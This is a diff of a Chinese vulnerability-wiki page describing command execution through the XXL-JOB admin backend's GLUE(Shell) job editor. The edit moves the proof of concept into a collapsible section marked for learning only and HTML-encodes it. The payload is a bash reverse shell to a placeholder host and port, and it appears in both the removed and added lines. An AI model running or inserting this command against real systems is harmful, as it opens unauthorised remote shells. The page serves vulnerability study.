@@ -76,8 +76,10 @@ docker-compose up -d
 
 ```
 运行模式 GLUE(Shell)
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/XXL-JOB%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20241112144436276.png)
 
 点击 GLUE IDE，编辑脚本：
@@ -94,8 +96,9 @@ docker-compose up -d
 
 ```plain
 #!/bin/bash
-bash -i >& /dev/tcp/your-ip/8888 0>&1 
-```
+&#98;ash -i &gt;&amp; &#47;dev/tcp/your-ip/8888 0&gt;&amp;1 </code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/XXL-JOB%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20241112145109853.png)
 
